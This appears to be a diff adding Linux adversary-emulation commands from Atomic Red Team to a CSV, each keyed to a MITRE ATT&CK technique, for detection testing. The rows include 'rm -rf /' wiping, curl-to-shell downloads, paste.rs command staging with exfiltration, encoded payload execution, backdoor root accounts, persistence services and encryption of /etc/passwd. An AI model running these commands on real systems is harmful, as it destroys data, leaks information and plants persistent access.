+rm -f /tmp/victim-files/T1070.004-test.txt,T1070.004,Indicator Removal on Host: File Deletion
+rm -rf /tmp/victim-folder,T1070.004,Indicator Removal on Host: File Deletion
+shred -u /tmp/victim-shred.txt,T1070.004,Indicator Removal on Host: File Deletion
+"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null",T1070.004,Indicator Removal on Host: File Deletion
+touch -a -t 197001010000.00 /tmp/T1070.006-access.txt,T1070.006,Indicator Removal on Host: Timestomp
+touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt,T1070.006,Indicator Removal on Host: Timestomp
+"NOW=$(date +%m%d%H%M%Y)
+date 010100001971
+touch /tmp/T1070.006-creation.txt
+date ""$NOW""
+stat /tmp/T1070.006-creation.txt",T1070.006,Indicator Removal on Host: Timestomp
+"touch /tmp/T1070.006-reference.txt
+touch -acmr /bin/sh /tmp/T1070.006-reference.txt",T1070.006,Indicator Removal on Host: Timestomp
+"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*",T1070.008,Email Collection: Mailbox Manipulation
+"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done",T1070.008,Email Collection: Mailbox Manipulation
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log,T1074.001,Data Staged: Local Data Staging
+"password=$(openssl passwd -1 art)
+([ ""$(uname)"" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))
+su art -c ""whoami; exit""",T1078.003,Valid Accounts: Local Accounts
+"useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
+usermod --lock art
+usermod --expiredate ""1"" art
+usermod --unlock art
+usermod --expiredate ""99999"" art
+su -c whoami art",T1078.003,Valid Accounts: Local Accounts
+"pw useradd art -g wheel -s /bin/sh
+echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0
+pw lock art
+pw usermod art -e +1d
+pw unlock art
+pw user mod art -e +99d
+su art
+whoami
+exit",T1078.003,Valid Accounts: Local Accounts
+"cat /etc/passwd |grep nobody
+chsh --shell /bin/bash nobody
+usermod --password $(openssl passwd -1 nobody) nobody
+su -c ""whoami"" nobody",T1078.003,Valid Accounts: Local Accounts
+"cat /etc/passwd |grep nobody
+pw usermod nobody -s /bin/sh
+echo $(openssl passwd -1 art) | pw mod user nobody -h 0
+su nobody
+whoami
+exit",T1078.003,Valid Accounts: Local Accounts
+"uname -a >> /tmp/T1082.txt
+if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi
+if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   
+if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi
+if [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi
+uptime >> /tmp/T1082.txt
+cat /tmp/T1082.txt 2>/dev/null",T1082,System Information Discovery
+"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
+if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""Droplet\|HVM\|VirtualBox\|VMware""; fi
+if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi
+if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi
+if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi
+if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi
+if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi
+if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi",T1082,System Information Discovery
+"sudo lsmod | grep -i ""vboxsf\|vboxguest""
+sudo lsmod | grep -i ""vmw_baloon\|vmxnet""
+sudo lsmod | grep -i ""xen-vbd\|xen-vnif""
+sudo lsmod | grep -i ""virtio_pci\|virtio_net""
+sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""",T1082,System Information Discovery
+"kldstat | grep -i ""vmm""
+kldstat | grep -i ""vbox""",T1082,System Information Discovery
+hostname,T1082,System Information Discovery
+env,T1082,System Information Discovery
+"lsmod
+kmod list
+grep vmw /proc/modules",T1082,System Information Discovery
+"kldstat
+kldstat | grep vmm",T1082,System Information Discovery
+"ls -a >> /tmp/T1083.txt
+if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
+file */* *>> /tmp/T1083.txt
+cat /tmp/T1083.txt 2>/dev/null
+find . -type f
+ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
+locate *
+which sh",T1083,File and Directory Discovery
+"cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
+if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
+find . -type f -iname *.pdf >> /tmp/T1083.txt
+cat /tmp/T1083.txt
+find . -type f -name "".*""",T1083,File and Directory Discovery
+findmnt -t nfs,T1083,File and Directory Discovery
+"cat /etc/passwd > /tmp/T1087.001.txt
+cat /tmp/T1087.001.txt",T1087.001,Account Discovery: Local Account
+"if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > /tmp/T1087.001.txt; fi;
+if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > /tmp/T1087.001.txt; fi;
+cat /tmp/T1087.001.txt",T1087.001,Account Discovery: Local Account
+"grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
+grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
+cat /tmp/T1087.001.txt 2>/dev/null",T1087.001,Account Discovery: Local Account
+username=$(id -u -n) && lsof -u $username,T1087.001,Account Discovery: Local Account
+"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog"" 
+$cmd > /tmp/T1087.001.txt
+cat /tmp/T1087.001.txt",T1087.001,Account Discovery: Local Account
+"groups
+id",T1087.001,Account Discovery: Local Account
+"ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b ""CN=Users,DC=example,DC=test"" -s sub -a always -z 1000 dn",T1087.002,Account Discovery: Domain Account
+ldapdomaindump -u domain\user -p password 127.0.0.1 -o /tmp/T1087,T1087.002,Account Discovery: Domain Account
+"export http_proxy=127.0.0.1:3128
+curl http://google.com",T1090.001,Proxy: Internal Proxy
+"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor",T1090.003,Proxy: Multi-hop Proxy
+"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",T1098.004,SSH Authorized Keys
+"STAGE_URL=$(curl -s -X POST -d ""echo Simulated host discovery output"" ""https://paste.rs"")
+echo ""Command staged at: $STAGE_URL""
+OUTPUT=$(curl -s ""$STAGE_URL"" | sh 2>&1)
+echo ""Fetched and executed command. Output: $OUTPUT""
+EXFIL_URL=$(echo ""$OUTPUT"" | curl -s -X POST --data-binary @- ""https://paste.rs"")
+echo ""Results exfiltrated to: $EXFIL_URL""
+echo ""--- Attacker sees ---""
+curl -s ""$EXFIL_URL""",T1102.002,Web Service: Bidirectional Communication
+rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files,T1105,Ingress Tool Transfer
+rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files,T1105,Ingress Tool Transfer
+scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/,T1105,Ingress Tool Transfer
+scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/,T1105,Ingress Tool Transfer
+sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp',T1105,Ingress Tool Transfer
+sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/,T1105,Ingress Tool Transfer
+"timeout --preserve-status 1 whois -h localhost -p 8443 ""Hello from Atomic Red Team test T1105"" > /tmp/T1105.whois.out",T1105,Ingress Tool Transfer
+curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh,T1105,Ingress Tool Transfer
+"useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
+su -c ""cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash"" art",T1110.001,Brute Force: Password Guessing
+"useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
+su art
+cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash",T1110.001,Brute Force: Password Guessing
+"pw adduser art -g wheel -s /bin/sh
+echo ""password123"" | pw usermod art -h 0
+su art
+cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash",T1110.001,Brute Force: Password Guessing
+"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
+for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@localhost;done",T1110.004,Brute Force: Credential Stuffing
+"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
+for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@localhost;done",T1110.004,Brute Force: Credential Stuffing
+"xwd -root -out /tmp/T1113_desktop.xwd
+xwud -in /tmp/T1113_desktop.xwd",T1113,Screen Capture
+"xwd -root -out /tmp/T1113_desktop.xwd
+xwud -in /tmp/T1113_desktop.xwd",T1113,Screen Capture
+import -window root /tmp/T1113_desktop.png,T1113,Screen Capture
+import -window root /tmp/T1113_desktop.png,T1113,Screen Capture
+"apt install xclip -y
+history | tail -n 30 | xclip -sel clip
+xclip -o > history.txt",T1115,Clipboard Data
+date,T1124,System Time Discovery
+"echo -n 111-11-1111 | base64
+curl -XPOST MTExLTExLTExMTE=.redcanary.com",T1132.001,Data Encoding: Standard Encoding
+"echo -n 111-11-1111 | b64encode -r -
+curl -XPOST MTExLTExLTExMTE=.redcanary.com",T1132.001,Data Encoding: Standard Encoding
+smbstatus --shares,T1135,Network Share Discovery
+smbstatus --shares,T1135,Network Share Discovery
+useradd -M -N -r -s /bin/bash -c evil_account evil_user,T1136.001,Create Account: Local Account
+pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account,T1136.001,Create Account: Local Account
+"useradd -g 0 -M -d /root -s /bin/bash butter
+if [ $(cat /etc/os-release | grep -i 'Name=""ubuntu""') ]; then echo ""butter:BetterWithButter"" | sudo chpasswd; else echo ""BetterWithButter"" | passwd --stdin butter; fi;",T1136.001,Create Account: Local Account
+"pw useradd butter -g 0 -d /root -s /bin/sh
+echo ""BetterWithButter"" | pw usermod butter -h 0",T1136.001,Create Account: Local Account
+"echo ""dn: CN=Admin User,CN=Users,DC=example,DC=test\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@example.test\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test"" > tempadmin.ldif
+echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif
+ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif",T1136.002,Create Account: Domain Account
+"echo ""dn: cn=Atomic User, cn=Users,dc=example,dc=test\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif
+echo ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif
+ldapadd -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -f tempadmin.ldif",T1136.002,Create Account: Domain Account
+"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""Hello from Atomic Red Team test T1140!"".encode());print(enc.decode())')
+python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""
+python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""
+python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""
+python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())""
+echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""
+echo $ENCODED > /tmp/T1140.encoded && python3 -c ""import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())""",T1140,Deobfuscate/Decode Files or Information
+"ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));"")
+perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""
+echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
+echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,""<"",""/tmp/T1140.encoded"");print(decode_base64(<$f>));'",T1140,Deobfuscate/Decode Files or Information
+"ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64)
+printf $ENCODED | base64 -d
+echo $ENCODED | base64 -d
+echo $(echo $ENCODED) | base64 -d
+echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d
+echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d
+bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""",T1140,Deobfuscate/Decode Files or Information
+"ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | b64encode -r -)
+printf $ENCODED | b64decode -r
+echo $ENCODED | b64decode -r
+echo $(echo $ENCODED) | b64decode -r
+echo $ENCODED > /tmp/T1140.encoded && b64encode -r /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && b64decode -r < /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | b64decode -r
+echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | b64decode -r",T1140,Deobfuscate/Decode Files or Information
+"echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
+echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
+echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
+echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh",T1140,Deobfuscate/Decode Files or Information
+"ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)
+printf $ENCODED | xxd -r -p
+echo $ENCODED | xxd -r -p
+echo $(echo $ENCODED) | xxd -r -p
+echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p
+echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p",T1140,Deobfuscate/Decode Files or Information
+"echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
+echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
+echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
+echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash",T1140,Deobfuscate/Decode Files or Information
+"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""AAkqKQEM""; key = ""waEHleblxiQjoxFJQaIMLdHKz""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",T1140,Deobfuscate/Decode Files or Information
+"kubectl run atomic-npm-install --image=node:18 --restart=Never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install tinycolor --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json""",T1195.002,Compromise Software Supply Chain
+cat /etc/pam.d/common-password,T1201,Password Policy Discovery
+cat /etc/pam.d/passwd,T1201,Password Policy Discovery
+cat /etc/security/pwquality.conf,T1201,Password Policy Discovery
+"cat /etc/pam.d/system-auth
+cat /etc/security/pwquality.conf",T1201,Password Policy Discovery
+cat /etc/login.defs,T1201,Password Policy Discovery
+"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \;
+cat /tmp/T1217-Firefox.txt 2>/dev/null",T1217,Browser Bookmark Discovery
+"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> /tmp/T1217-Chrome.txt \;
+cat /tmp/T1217-Chrome.txt 2>/dev/null",T1217,Browser Bookmark Discovery
+chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chown root:root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chown -R root:root /tmp/AtomicRedTeam/atomics/T1222.002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chown -R root /tmp/AtomicRedTeam/atomics/T1222.002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+chattr -i /var/spool/cron/root,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+"touch /tmp/T1222.002.txt
+chflags simmutable /tmp/T1222.002.txt
+chflags nosimmutable /tmp/T1222.002.txt",T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+/tmp/T1222002 /tmp/ T1222002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+/tmp/T1222002 /tmp/ T1222002,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+sudo /tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+/tmp/T1222002own PathToAtomicsFolder/T1222.002/src/chown.c,T1222.002,"File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification"
+dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes,T1485,Data Destruction
+"echo ""passwd"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd",T1486,Data Encrypted for Impact
+$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd,T1486,Data Encrypted for Impact
+"which_ccencrypt=`which ccencrypt`
+cp /etc/passwd /tmp/passwd;
+$which_ccencrypt -T -K passwd /tmp/passwd",T1486,Data Encrypted for Impact
+"which_openssl=`which openssl`
+$which_openssl genrsa -out /tmp/key.pem 2048
+$which_openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem
+$which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip",T1486,Data Encrypted for Impact
+sudo systemctl stop cron,T1489,Service Stop
+sudo killall -SIGTERM cron,T1489,Service Stop
+sudo kill -SIGTERM $(pgrep cron),T1489,Service Stop
+sudo pkill -SIGTERM ^cron$,T1489,Service Stop
+"echo ""e"" > /proc/sysrq-trigger",T1489,Service Stop
+yes > /dev/null,T1496,Resource Hijacking
+"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;
+if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;",T1497.001,Virtualization/Sandbox Evasion: System Checks
+"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi",T1497.001,Virtualization/Sandbox Evasion: System Checks
+"ping -c 250 8.8.8.8 > /dev/null
+whoami",T1497.003,Time Based Evasion
+ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd',T1518.001,Software Discovery: Security Software Discovery
+pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd',T1518.001,Software Discovery: Security Software Discovery
+shutdown -r now,T1529,System Shutdown/Reboot
+shutdown -h now,T1529,System Shutdown/Reboot
+reboot,T1529,System Shutdown/Reboot
+halt -p,T1529,System Shutdown/Reboot
+halt -r,T1529,System Shutdown/Reboot
+halt --reboot,T1529,System Shutdown/Reboot
+poweroff,T1529,System Shutdown/Reboot
+poweroff -r 3,T1529,System Shutdown/Reboot
+poweroff --reboot,T1529,System Shutdown/Reboot
+"echo ""b"" > /proc/sysrq-trigger",T1529,System Shutdown/Reboot
+passwd ARTUser #enter admin password > enter new password > confirm new password,T1531,Account Access Removal
+"echo ""[Unit]"" > /etc/systemd/system/art-systemd-service.service
+echo ""Description=Atomic Red Team Systemd Service"" >> /etc/systemd/system/art-systemd-service.service
+echo """" >> /etc/systemd/system/art-systemd-service.service
+echo ""[Service]"" >> /etc/systemd/system/art-systemd-service.service
+echo ""Type=simple""
+echo ""ExecStart=/bin/touch /tmp/art-systemd-execstart-marker"" >> /etc/systemd/system/art-systemd-service.service
+echo ""ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker"" >> /etc/systemd/system/art-systemd-service.service
+echo ""ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker"" >> /etc/systemd/system/art-systemd-service.service
+echo ""ExecReload=/bin/touch /tmp/art-systemd-execreload-marker"" >> /etc/systemd/system/art-systemd-service.service
+echo ""ExecStop=/bin/touch /tmp/art-systemd-execstop-marker"" >> /etc/systemd/system/art-systemd-service.service
+echo ""ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker"" >> /etc/systemd/system/art-systemd-service.service
+echo """" >> /etc/systemd/system/art-systemd-service.service
+echo ""[Install]"" >> /etc/systemd/system/art-systemd-service.service
+echo ""WantedBy=default.target"" >> /etc/systemd/system/art-systemd-service.service
+systemctl daemon-reload
+systemctl enable art-systemd-service.service
+systemctl start art-systemd-service.service",T1543.002,Create or Modify System Process: SysV/Systemd Service
+"echo '#\!/bin/sh' > /usr/local/etc/rc.d/art-test
+echo ' ' >> /usr/local/etc/rc.d/art-test
+echo '#' >> /usr/local/etc/rc.d/art-test
+echo '# PROVIDE: art-test' >> /usr/local/etc/rc.d/art-test
+echo '# REQUIRE: LOGIN' >> /usr/local/etc/rc.d/art-test
+echo '# KEYWORD: shutdown' >> /usr/local/etc/rc.d/art-test
+echo ' ' >> /usr/local/etc/rc.d/art-test
+echo '. /etc/rc.subr' >> /usr/local/etc/rc.d/art-test
+echo ' ' >> /usr/local/etc/rc.d/art-test
+echo 'name=""art_test""' >> /usr/local/etc/rc.d/art-test
+echo 'rcvar=art_test_enable' >> /usr/local/etc/rc.d/art-test
+echo 'load_rc_config ${name}' >> /usr/local/etc/rc.d/art-test
+echo 'command=""/usr/bin/touch""' >> /usr/local/etc/rc.d/art-test
+echo 'start_cmd=""art_test_start""' >> /usr/local/etc/rc.d/art-test
+echo '' >> /usr/local/etc/rc.d/art-test
+echo 'art_test_start()' >> /usr/local/etc/rc.d/art-test     
+echo '{' >> /usr/local/etc/rc.d/art-test
+echo '  ${command} /tmp/art-test.marker' >> /usr/local/etc/rc.d/art-test
+echo '}' >> /usr/local/etc/rc.d/art-test
+echo ' ' >> /usr/local/etc/rc.d/art-test     
+echo 'run_rc_command ""$1""' >> /usr/local/etc/rc.d/art-test
+chmod +x /usr/local/etc/rc.d/art-test
+service art-test enable
+service art-test start",T1543.002,Create or Modify System Process: SysV/Systemd Service
+"echo ""#!/bin/bash"" > /etc/init.d/T1543.002
+echo ""### BEGIN INIT INFO"" >> /etc/init.d/T1543.002
+echo ""# Provides : Atomic Test T1543.002"" >> /etc/init.d/T1543.002
+echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002
+echo ""# Required-Stop : "" >> /etc/init.d/T1543.002
+echo ""# Default-Start: 2 3 4 5"" >> /etc/init.d/T1543.002
+echo ""# Default-Stop: "" >> /etc/init.d/T1543.002
+echo ""# Short Description: Atomic Test for Systemd Service Creation"" >> /etc/init.d/T1543.002
+echo ""### END INIT INFO"" >> /etc/init.d/T1543.002
+echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002
+chmod +x /etc/init.d/T1543.002
+if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi
+systemctl enable T1543.002
+systemctl start T1543.002
+echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"""" | sudo tee -a /etc/init.d/T1543.002
+systemctl daemon-reload
+systemctl restart T1543.002",T1543.002,Create or Modify System Process: SysV/Systemd Service
+"mkdir -p $HOME/.config/systemd/user
+cp ""$PathToAtomicsFolder/T1543.002/src/sysmon.py"" ""$HOME/.config/systemd/user/sysmon.py""
+echo ""[Unit]"" > $HOME/.config/systemd/user/sysmon.service
+echo ""Description=System Monitor Service"" >> $HOME/.config/systemd/user/sysmon.service
+echo """" >> $HOME/.config/systemd/user/sysmon.service
+echo ""[Service]"" >> $HOME/.config/systemd/user/sysmon.service
+echo ""Type=simple"" >> $HOME/.config/systemd/user/sysmon.service
